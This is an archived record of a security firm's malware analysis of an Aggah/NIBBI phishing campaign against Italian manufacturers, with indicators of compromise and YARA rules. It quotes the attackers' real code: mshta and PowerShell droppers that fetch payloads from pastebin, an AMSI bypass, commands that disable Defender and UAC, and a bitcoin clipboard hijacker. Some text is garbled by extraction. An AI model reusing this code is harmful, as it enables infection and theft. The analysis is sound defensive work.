{
    "id": "957d83e9-457f-4a00-b91a-719b0747aeaa",
    "created_at": "2023-01-12T15:07:21.415902Z",
    "updated_at": "2025-03-27T02:16:16.921324Z",
    "deleted_at": null,
    "sha1_hash": "b0eeb4f27d695518aa8037b19e27cb6c6248f84f",
    "title": "2020-05-22 - Cyber-Criminal espionage Operation insists on Italian Manufacturing",
    "authors": "",
    "file_creation_date": "2022-05-28T15:43:42Z",
    "file_modification_date": "2022-05-28T15:43:42Z",
    "file_size": 8514657,
    "plain_text": "# Cyber-Criminal espionage Operation insists on Italian Manufacturing\n\n**[yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/](https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/)**\n\n05/22/2020\n\n## Introduction\n\n\nMay 22, 2020\n\n\nDuring our Cyber Threat Intelligence monitoring we spotted new malicious activities targeting some Italian companies operating worldwide in\nthe manufacturing sector, some of them also part of the automotive production chain.\n\n[The group behind this activity is the same we identified in the past malicious operations described in Roma225 (12/2018), Hagga (08/2019),](https://yoroi.company/research/the-enigmatic-roma225-campaign/)\n[Mana (09/2019), YAKKA (01/2020). This actor was first spotted by PaloAlto‚Äôs UNIT42 in 2018 during wide scale operations against technology,](https://yoroi.company/research/apt-or-not-apt-whats-behind-the-aggah-campaign/)\nretail, manufacturing, and local government industries in the US, Europe and Asia. They also stated the hypothesis of possible overlaps with\nthe Gorgon APT group, but no clear evidence confirmed that.\n\nHowever, in order to keep track of all of our report, we synthesized all the monitored campaigns, with their TTPs and final payload:\n\nTable 1: Synthetic table of the campaigns\n\nAs we can see from the table, the Aggah campaigns varied in the time, but it maintained some common points. All campaigns used as the\ninitial stage an office document (PowerPoint or Excel) armed with macro and some of them used injection methods.\n\nAll attack operations used a ‚ÄúSigned Binary Proxy Execution‚Äù technique abusing Mshta, a legit Microsoft tool, and used at least an executable\nfile for the infection. In addition, the use of PowerShell stage or the abuse of legit web service has been reported in some campaigns.\n\nFurthermore the CMSTP bypass exploit is a new feature present only in the 2020, because the first malwares identified to exploit this\nvulnerability all date back to mid/end 2019, making think the fact that the Threat Actor likes to test the latest disclosed exploits in order to make\nits campaigns always at the forefront. Regarding persistence mechanisms, we note that initially scheduled tasks were used, but in the latest\ninfections the registry run keys were used. All threats use at least one obfuscation method to make the analysis harder.\n\n\n-----\n\noo g at t e e o ut o o t e a pay oads, e ca say t at t s e o ut o s ce ta y due to a c o o og ca acto, s ce e e ge at ad\nbecome obsolete, but the evolution is also due to the technological factor and its means: revenge rat has the classic functionality of spyware,\nwhile AZORult is considered an info stealer. As a last payload, Agent Tesla was used which collects all the functionality of the previous\npayloads as it is considered an info stealer and spyware.\n\n## Technical Analysis\n\nThe infection chain starts with a malicious Microsoft Powerpoint weaponized with a malicious macro.\n\nHash 7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3\n\nThreat Malicious macro\n\n\nBrief\nDescription\n\n\nMalicious ppt dropper with macro.\n\n\nSsdeep 192:EFm9QiR1zQRZ0DfZGJjBVySCGVBdJWUpFVzsn6xVNdwWFj/WOvYoZLlmYvJuec9r:i8R1ERZ0DMJjU+bRuxURKMxpcksPY\n\nTable 2. Sample information\n\nThe content of the macro is quite easy to read and the content is short and easy to read:\n\nFigure 1: Content of the malicious macro\n\nThe VBA macro is responsible to download and execute malicious code retrieved from pastebin. j[.mp is an url shortening service, the\nfollowing request redirect and download a pastebin content:\n\nFigure 2: Shortener resolution\n\n## The MSHTA Drop Chain\n\nLike the previous campaigns, this threat actor uses a Signed Binary Proxy Execution (ID: T1218) technique abusing ‚Äúmshta.exe‚Äù (T1170) a\nsigned and legit Microsoft tool. Adversaries can use mshta.exe to proxy execution of malicious .hta files, Javascript or VBScript.\n\nFigure 3: Piece of code of the Bnv7ruYp paste\n\nAs shown in the above figure, the code is simply URI encoded by replacing each instance of certain characters by one, two or three escape\nsequences representing the UTF-8 encoding of the character.\n\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">'id1CreateObject(\"WScript.Shell\").Run\n\"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\5CzmZ5NS\"\"\"\nCreateObject(\"WScript.Shell\").Run StrReverse(\"/ 08 om/ ETUNIM cs/ etaerc/ sksathcs\") + \"tn \"\"Pornhubs\"\" /tr\n\"\"\\\"\"mshta\\\"\"http:\\\\pastebin.com\\raw\\5CzmZ5NS\"\" /F \",0\n'id2CreateObject(\"WScript.Shell\").RegWrite StrReverse(\"TRATS\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\"\n+ \"t\" + \"a\"\"\"\"http:\\\\pastebin.com\\raw\\sJEBiiMw\"\"\", \"REG_SZ\"'id3CreateObject(\"WScript.Shell\").RegWrite\nStrReverse(\"\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a\"\"\"\"http:\\\\pastebin.com\\raw\\YL0je2fU\"\"\",\n\"REG_SZ\"\n\n'defidCreateObject(\"WScript.Shell\").Run \"\"\"mshta\"\"\"\"http:\\\\pastebin.com\\raw\\UyFaSxgj\"\"\"CreateObject(\"WScript.Shell\").RegWrite\nStrReverse(\"FED\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\UCKH\"), \"\"\"m\" + \"s\" + \"h\" + \"t\" +\n\"a\"\"\"\"http:\\\\pastebin.com\\raw\\UyFaSxgj\"\"\", \"REG_SZ\"\n\nself.close</script>\n\nCode Snippet 1\n\nThis stage acts as a dropper, in fact, it downloads and executes some pastebin contents through mshta.exe.\n\nFigure 4: Evidence of the NIBBI author\n\nThis lasta campaign has been dubbed with the name of the Pastebin user spreading the malicious pastes. This time the name is ‚ÄúNIBBI‚Äù. The\nfirst component is 5CzmZ5NS:\n\nFigure 5: Piece of the code of 5CzmZ5NS paste\n\nThe second one is sJEBiiMw:\n\nFigure 6: Piece of the code of the sJEBiiMw paste\n\nThe third one, YL0je2fU:\n\n\n-----\n\ngu e ece o t e code o t e 0je U paste\n\nand the fourth component, UyFaSxgj:\n\nFigure 8: Piece of the code of the UyFaSxgj paste\n\nThis obfuscation technique is typical of this particular actor and he largely leveraged it in many malicious operations. Moreover, the usage of a\nlegit website such as pastebin (T1102) gives a significant amount of cover such as advantages of being very often whitelisted. Using such a\nservice permits to reduce the C2 exposure. In the past, other groups also used similar techniques to decouple attack infrastructure information\nfrom their implant configuration, groups such as APT41, FIN6 or FIN7.\n\nOnce decoded the first component (5CzmZ5NS), it unveils some logic, as shown in Code Snippet 2. First of all, the script set a registry key, as\na windows persistence mechanism (T1060) in which it place the execution of the following command: \"mshta\n_vbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.Shell\"\"\"\").Run \"\"\"\"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\"_\n\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">CreateObject(\"WScript.Shell\").RegWrite \"HKCU\\Software\\Microsoft\\Wind\nvbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.Shell\"\"\"\").Run \"\"\"\"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\"\"\"\", 0 : window.close\"\")\", \"RE\nCreateObject(\"Wscript.Shell\").regwrite \"HKCU\\Software\\iamresearcher\", \"$fucksecurityresearchers='contactmeEX'.replace('contactme','I');sal M $\ngoogle.com -count 1 -Quiet} until ($ping);$iwannajoinuiwannaleavedsshit = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.\n$iwannajoinuiwannaleavedsshit;$iwannaleftsellingtools= New-Object -Com\nMicrosoft.XMLHTTP;$iwannaleftsellingtools.open('GET','https://pastebin.com/raw/rnS6CUzX',$false);$iwannaleftsellingtools.send();$iwannaleftse\n$iwannaleftsellingtoolsy -split '-' |ForEach-Object {[char][byte]\"\"0x$_\"\"};$asciiString= $asciiChars -join ''|M;[Byte[]]$Cli2= iex(iex('(&(GCM *W-O*)'+\n['Net.'+'WebC'+'lient)'+'.Dow'+'nload'+'Str'+'ing(''https://pastebin.com/raw/Rk4engdU'').replace(''#'',''!#[email protected]#'').replace(''!#[email protecte](https://yoroi.company/cdn-cgi/l/email-protection)\n\n[System.Reflection.Assembly]::Load($decompressedByteArray);[rOnAlDo]::ChRiS('InstallUtil.exe',$Cli2)\", \"REG_SZ\"\nConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComp\nobjWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objPr\nGetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell ((gp HKCU:\\Software).iamresearcher)|IEX\", null, o\nscript kiddie expert i read code from samples on site then compile in my way'i am not a coder üòâ i watch you on twitter every day thanks üôÇ i love\nself.close\n</script>\n\nCode Snippet 2\n\nThe code contains some ‚Äúfunny‚Äù comments related to the twitter community of security researchers which constantly monitor the actor\noperations. Then, the final payload is identified by Rk4engdU paste.\n\nFigure 9: Piece of the rnS6CUz paste\n\nDecoding this hex stream we get the following powershell code:\n\nfunction UNpaC0k3333300001147555 {\n\n[CmdletBinding()]  Param ([byte[]] $byteArray) Process {   Write-Verbose \"Get-DecompressedByteArray\"    $input = New-Object\nSystem.IO.MemoryStream(, $byteArray )   $output = New-Object System.IO.MemoryStream      $01774000 = New-Object\nSystem.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)\n$puffpass = New-Object byte[](1024)  while($true){    $read = $01774000.Read($puffpass, 0, 1024)    if ($read -le 0)\n{break}    $output.Write($puffpass, 0, $read)    }    [byte[]] $bout333 = $output.ToArray()    Write-Output $bout333  }}\n$t0='DEX'.replace('D','I');sal g $t0;[Byte[]]$MNB=('OBFUSCATED PAYLOAD ONE'.replace('@!','0x'))| g;\n\n[Byte[]]$blindB=('OBFUSCATED PAYLOAD TWO'.replace('@!','0x'))| g\n\n[byte[]]$deblindB = UNpaC0k3333300001147555 $blindB\n$blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass()\n\n[byte[]]$decompressedByteArray = UNpaC0k3333300001147555 $MNB\n\nCode Snippet 3\n\n### The Powershell Loader\n\nThe Code Snippet 3 is a Powershell script in which the function ‚ÄúUNpaC0k3333300001147555‚Äù is declared, having the purpose to manipulate\nthe two payloads in the right way. Both of them are .NET binaries. The de-obfuscated code is stored in the deblindB variable and then\nexecuted.\n\nAs suggested by the name deblindB, invoke the execution of the static method ‚ÄúBypass‚Äù of the ‚ÄúAmsi‚Äù class.\n\nFigure 10: Amsi Bypass exploit evidence\n\nInstead, the payload embedded inside the variable $MNB is another type of injection tool, but this one is not executed by the script, probably\nbecause both the binaries perform the same action and only one is sufficient.\n\nAt this point, we deepen the ‚ÄúsJEBiiMw‚Äù component obtaining:\n\n\n-----\n\n<script language= &#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116; >Const HIDDEN_WINDOW = 0strComputer = . Set objWMIService =\nGetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")Set objStartup =\nobjWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objPr\nGetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell.exe -nologo -WindowStyle Hidden $_Xpin = ((New\nNet.WebClient).DowNloAdSTRiNg('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'p'+'a'+'s'+'t'+'e'+'b'+'i'+'n'+'.'+'c'+'o'+'m'+'/'+'r'+'a'+'w'+'/ygwLUS9C'));$_Xpin=$_Xpin.re\n[(@*#([email protected]#*').replace('*!(@*#([email protected]#*','0');$_Xpin = $_Xpin.ToCharArray();[Array]::Reverse($_Xpin);[byte[]]$_PMP =](https://yoroi.company/cdn-cgi/l/email-protection)\n\n[System.Convert]::FromBase64String($_Xpin);$_1 = [System.Threading.Thread]::GetDomain().Load($_PMP);$_1.EntryPoint.invoke($S,$X)\", null\nobjConfig, intProcessID)\n\nself.close\n\n</script>\n\nCode Snippet 4\n\nThis script downloads and executes another script from pastebin: ygwLUS9C. It is a base64 encoded script with some basic string replacing.\n[We also noticed this executable uses the CMSTP bypass technique (T1191), already seen in our previous report.](https://yoroi.company/research/aggah-how-to-run-a-botnet-without-renting-a-server-for-more-than-a-year/)\n\nFigure 11: CMSTP Bypass evidence\n\nHowever, in this case, there is a new element differently the previous version: through the CMSTP bypass, a VBS script is written in the\n‚Äú\\%TEMP%\\‚Äù folder, which executes many disruptive commands:\n\nFigure 12: Evidence of the VBS script loaded and executed\n\nThe VBS script, as also mentioned inside the first row as comment, has the objective to set to zero the level of security of the infected\nmachine. The script is the following:\n\n'this script will put system on 0 securityIf Not WScript.Arguments.Named.Exists(\"elevate\") Then CreateObject(\"Shell.Application\").ShellExecute W\nOn Error Resume NextSet WshShell = CreateObject(\"WScript.Shell\")WshShell.RegWrite \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defend\nWScript.Sleep 100\n\noutputMessage(\"Set-MpPreference -DisableRealtimeMonitoring $true\")outputMessage(\"Set-MpPreference -DisableBehaviorMonitoring $true\")out\n\nSub outputMessage(byval args)On Error Resume NextConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmt\n\nEnd SubOn Error Resume NextConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLe\n(36,117,115,101,114,80,97,116,104,32,61,32,36,101,110,118,58,85,83,69,82,80,82,79,70,73,76,69,10,36,112,97,116,104,69,120,99,108,117,115,\n\n[System.Text.Encoding]::ASCII.GetString($cici)|IEX\", null, objConfig, intProcessID)\n\nCreateObject(\"WScript.Shell\").RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\",\"0\", \"REG_DWORD\n\nSet wso = CreateObject(\"WScript.Shell\")wso.RegWrite \"HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings\", 1, \"REG_DWORD\"w\n1, \"REG_DWORD\"wso.RegWrite \"HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\", 1, \"REG_DWOR\n\"REG_DWORD\"wso.RegWrite \"HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV\", 1, \"REG_DW\n\"HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Options\\DontUpdateLinks\", 1, \"REG_DWORD\"wso.RegWrite \"HKCU\\Software\\Microsoft\\Office\n\nCode Snippet 5\n\nAs seen in the code a powershell command is hidden inside the variable named $cici, which is immediately converted from the decimal to the\nrelative ascii value.\n\n$userPath = $env:USERPROFILE$pathExclusions = New-Object System.Collections.ArrayList$processExclusions = New-Object\nSystem.Collections.ArrayList$pathExclusions.Add('C:\\') > $null$processExclusions.Add('Msbuild.exe') >\n$null$processExclusions.Add('Calc.exe') > $null$processExclusions.Add('powershell.exe') > $null$processExclusions.Add('wscript.exe') >\n$null$processExclusions.Add('mshta.exe') > $null$processExclusions.Add('cmd.exe') > $null$projectsFolder = 'd:\\'Add-MpPreference ExclusionPath $projectsFolderforeach ($exclusion in $pathExclusions){  Write-Host \"Adding Path Exclusion: \" $exclusion  AddMpPreference -ExclusionPath $exclusion}foreach ($exclusion in $processExclusions){  Write-Host \"Adding Process Exclusion: \"\n$exclusion  Add-MpPreference -ExclusionProcess $exclusion}Write-Host \"\"Write-Host \"Your Exclusions:\"$prefs = GetMpPreference$prefs.ExclusionPath$prefs.ExclusionProcess\n\nCode snippet 6\n\nIn Code Snippet 6 we found a powershell code instructed to insert in the Microsoft Windows Anti-Malware exclusions the following processes:\nmsbuild, calc, powershell, wscript, mshta and cmd.\n\nAnother script in this intricated chain is YL0je2fU:\n\n\n-----\n\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">\n\nCreateObject(\"WScript.Shell\").RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\replcia\", \"mshta vbscript:Execute(\"\"CreateObje\n\n[CreateObject(\"Wscript.Shell\").regwrite \"HKCU\\Software\\mogale\", \"[email protected]](https://yoroi.company/cdn-cgi/l/email-protection)\n(102,117,110,99,116,105,111,110,32,105,115,66,105,116,99,111,105,110,65,100,100,114,101,115,115,40,91,115,116,114,105,110,103,93,36,99,1\n\n[System.Text.Encoding]::ASCII.GetString($cici)|IEX\", \"REG_SZ\"\n\nConst HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComp\nself.close\n\n</script>\n\nCode Snippet 7\n\nEven in this case there is a powershell script embedded in it using the same variable name ‚Äú$cici‚Äù, but with the following body:\n\nfunction isBitcoinAddress([string]$clipboardContent){ if($clipboardContent[0] -ne '1') { return $false }\n\n$strLength = $clipboardContent.length if($strLength -lt 26 -or $strLength -gt 35) { return $false }\n\n$validRegex = '^[a-zA-Z0-9\\s]+$' if($clipboardContent -cnotmatch $validRegex) { return $false }\n\nreturn $true}$bitcoinAddresses = (\"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\",\n\"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\", \"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\",\n\"19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W\")$bitcoinAddressesSize = $bitcoinAddresses.length$i = 0$oldAddressSet = \"\"while(1){\n$clipboardContent = Get-Clipboard if((isBitcoinAddress($clipboardContent)) -ceq $true -and $clipboardContent -cne $oldAddressSet) { SetClipboard $bitcoinAddresses[$i] $oldAddressSet = $bitcoinAddresses[$i] $i = ($i + 1) % $bitcoinAddressesSize }}\n\nCode Snippet 8\n\nThe script performs a constant check in the clipboard of the victim machine, looking for bitcoin addresses and some of them are also\nhardcoded. The last stage is UyFaSxgj:\n\n<script language=\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\">Const HIDDEN_WINDOW = 0strComputer = \".\"Set objWMIService =\nGetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")Set objStartup =\nobjWMIService.Get(\"Win32_ProcessStartup\")Set objConfig = objStartup.SpawnInstance_objConfig.ShowWindow = HIDDEN_WINDOWSet objPr\nGetObject(\"winmgmts:root\\cimv2:Win32_Process\")errReturn = objProcess.Create( \"powershell.exe -nologo -WindowStyle Hidden $_Xpin = ((New\nNet.WebClient).DowNloAdSTRiNg('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'p'+'a'+'s'+'t'+'e'+'b'+'i'+'n'+'.'+'c'+'o'+'m'+'/'+'r'+'a'+'w'+'/eyGv9x4B'));$_Xpin=$_Xpin.rep\n[(@*#([email protected]#*').replace('*!(@*#([email protected]#*','0');$_Xpin = $_Xpin.ToCharArray();[Array]::Reverse($_Xpin);[byte[]]$_PMP =](https://yoroi.company/cdn-cgi/l/email-protection)\n\n[System.Convert]::FromBase64String($_Xpin);$_1 = [System.Threading.Thread]::GetDomain().Load($_PMP);$_1.EntryPoint.invoke($S,$X)\", null\nobjConfig, intProcessID)\n\nself.close\n\n</script>\n\nCode Snippet 9\n\nThis component spawn through powershell a script a binary file from a pastebin, eyGv9x4B, but, unfortunately, at the time of analysis, the\npaste has been removed.\n\nThis example could suggest to us the power of the malicious infrastructure built from the attacker, where components could be removed or\nreplaced with another one in every moment.\n\n### The Payload\n\nAs previously stated, the final payload is AgentTesla. It remains one of the most adopted commodity malware instructed to steal a large\n[number of sensitive information about the victim. During the past years, we constantly studied the evolution of this threat and we enumerated](https://yoroi.company/research/commodity-malware-reborn-the-agenttesla-total-oil-themed-campaign/)\nall the sensitive data grasped by it.\n\nHowever, also in this case, we obtained the final payload and the configuration of the SMTP client where sends the stolen information:\n\nFigure 13: Configuration of the AgentTesla SMTP client\n\nThe domain ‚Äúatn-com.pw‚Äù has been created ad-hoc in order to manage the infection campaign. Studying the uptime of the domain we were\nable to reconstruct the infection campaign of the threat actor.\n\n\n-----\n\nFigure 14: Information about the C2 uptime stats\nAs shown above, the domain has been registered on the last days of january and it has been active since the middle of April. After a short\nperiod of inactivity, it compared another time the 2nd of May since these days.\n\n## Conclusion\n\nThe actor hiding behind this campaign can undoubtedly be considered a persistent cyber-threat to many organizations operating in production\nsectors in Europe and, in the last months, also in Italy. Its intricate infection chain developed and tested during the years gave him the flexibility\nneeded to bypass many layers of traditional security defences, manipulating the delivery infrastructure from time to time.\n\nDuring the time, the actor‚Äôs delivery infrastructure was leveraged to install different kinds of malware: most of the time remote access trojans\nand info and credential stealing software. Such malware types are capable of enabling cyber-espionage and IP theft operations, potentially to\nre-sell stolen information on dark markets.\n\nNo doubt, we will keep going to track this threat.\n\n## Indicators of Compromise\n\nHashes\n\n7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3\nb969a3c28be2086813b21007c2ef89b429cbec56f49eb5b304615cfe3ef9318d\nf8c91d3d69ec47fb888e6239d7218c87bf6f4817489005d9978ba9d1eac49899\nf8f97ecd134f13c66f50c11e4f17948c0acb49dd306031c3559a0e7c34003723\ne4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5\n58a9a5b49c1871d8792f84c81d490b54a93da633f0355d6ebb4badef93854320\ncb1375d8163146b47fa28259d8c70022b35e22712b9f887d7c8b9c8751b32804\n28f6735b6cf7cc1613f465580da4113afe46cf96e60b8330619c32340c71d6a8\n540fce8483f6ca5516c9d8171dca4739e32a7bec1092f011f462d3c4ae4fd47b\n8912ea4551439a4925aba187eea2ac4eb5b43e458866812caa67d85c5420a2db\n8da105fd3f58ebfce0334f963370397f32fbef5bbb4bd6432ed18369dc46b959\n358a36a890383fc6aeaa89261e8a47b6217dd9bd1a31b63590b38bffe092a4f5\n1d10fca85f5a06e20a160299e6f8f4a528384a77934fce0d44f48cb7e6f5feb4\n\n\n-----\n\nopU s\n\nhttp[:\\\\j[.mp\\dmdmcrcrcryctcgufyguhmd\nPastebin\n\n5CzmZ5NS\nBnv7ruYp\nRk4engdU\nrnS6CUzX\nsJEBiiMw\nUyFaSxgj\nYL0je2fU\nygwLUS9C\neyGv9x4B'\nC2\n\natn-com[.pw\nPersistence\n\nSetting of registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nExfiltration\n\nSensitive information about the victim machine\n\n### Yara Rules\n\n\n-----\n\n```\n  meta:\n   description = \"Yara Rule for MacroPPS_NIBBI\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2020-05-21\"\n   tlp = \"white\"\n      SHA256 = \"7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3\"\n   category = \"informational\"\n  strings:\n          $a1 = {B5 B5 D6 FF FF B5 8C}\n          $a2 = {FF 00 63 B5 39 00 00 FF D6}\n          $a3 = \"Reverse\" \n  condition:\n     all of them\n}\nrule NIBBI_AggahCampaign_AMSIBYPASS_May2020{\n  meta:\n   description = \"Yara Rule for AMSI Bypass_NIBBI\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2020-05-21\"\n   tlp = \"white\"\n      SHA256 = \"e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5\"\n   category = \"informational\"\n  strings:\n          $a1 = {24 5A 20 F4 88 D7 C4 61 38}\n          $a2 = {76 FF 5A 20 76 05 76 23 61 38}\n          $s1 = {07 20 E7 3F 43 14 5A 20 EB E6 0D 25} \n          $s2 = \"ConfuserEx\"\n          $s3 = \"amsi.dll\"\n  condition:\n          uint16(0) == 0x5A4D and all of ($a*) and 2 of ($s*)\n}\nrule NIBBI_AggahCampaign_AgentTesla_May2020{\n  meta:\n   description = \"Yara Rule for AgentTesla Bypass_NIBBI\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2020-05-21\"\n   tlp = \"white\"\n      SHA256 = \"1d10fca85f5a06e20a160299e6f8f4a528384a77934fce0d44f48cb7e6f5feb4\"\n   category = \"informational\"\n  strings:\n          $a1 = {06 FE 0C 0A 00 20 6D E9 56 47 5A 20 57 AB}\n          $a2 = {00 20 6B 4F 2B 72 5A 20 F6 D4}\n          $s1 = {61 67 00 61 68 00 6C 76 00 61 65 00 61 75} \n          $s2 = {00 11 06 6F 38 01 00 06 16 6F 1E 02}\n          $s3 = {01 13 2D ?? 2D 16 17 8C 77}\n  condition:\n          uint16(0) == 0x5A4D and all of ($a*) and 2 of ($s*)\n}\n\n```\n_This blog post was authored by Luigi Martire, Giacomo d'Onofrio, Antonio Pirozzi and Luca Mella of Cybaze-Yoroi ZLAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-22 - Cyber-Criminal espionage Operation insists on Italian Manufacturing.pdf"
    ],
    "report_names": [
        "2020-05-22 - Cyber-Criminal espionage Operation insists on Italian Manufacturing.pdf"
    ],
    "threat_actors": [
        {
            "id": "f7aa6029-2b01-4eee-8fe6-287330e087c9",
            "created_at": "2022-10-25T16:07:23.536763Z",
            "updated_at": "2025-03-27T02:02:09.85219Z",
            "deleted_at": null,
            "main_name": "Deceptikons",
            "aliases": [
                "DeathStalker",
                "Deceptikons"
            ],
            "source_name": "ETDA:Deceptikons",
            "tools": [
                "EVILNUM",
                "Evilnum",
                "Janicab",
                "PowerPepper",
                "Powersing",
                "VileRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
            "created_at": "2023-01-06T13:46:38.485884Z",
            "updated_at": "2025-03-27T02:00:02.845851Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "Camouflage Tempest",
                "MageCart Group 6",
                "G0037",
                "TA4557",
                "SKELETON SPIDER",
                "ITG08",
                "White Giant",
                "GOLD FRANKLIN",
                "ATK88"
            ],
            "source_name": "MISPGALAXY:FIN6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
            "created_at": "2022-10-25T16:07:23.61665Z",
            "updated_at": "2025-03-27T02:02:09.889471Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "ATK 88",
                "Camouflage Tempest",
                "FIN6",
                "Gold Franklin",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "TAG-CR2",
                "White Giant"
            ],
            "source_name": "ETDA:FIN6",
            "tools": [
                "AbaddonPOS",
                "Agentemis",
                "AmmyyRAT",
                "Anchor_DNS",
                "BlackPOS",
                "CmdSQL",
                "Cobalt Strike",
                "CobaltStrike",
                "FlawedAmmyy",
                "FrameworkPOS",
                "Grateful POS",
                "JSPSPY",
                "Kaptoxa",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LockerGoga",
                "MMon",
                "Magecart",
                "Meterpreter",
                "Mimikatz",
                "More_eggs",
                "NeverQuest",
                "POSWDS",
                "Reedum",
                "Ryuk",
                "SCRAPMINT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Terra Loader",
                "TerraStealer",
                "Vawtrak",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "cobeacon",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8ce861d7-7fbd-4d9c-a211-367c118bfdbd",
            "created_at": "2023-01-06T13:46:39.153487Z",
            "updated_at": "2025-03-27T02:00:03.009422Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "TA4563",
                "EvilNum",
                "Jointworm",
                "KNOCKOUT SPIDER",
                "DeathStalker"
            ],
            "source_name": "MISPGALAXY:Evilnum",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
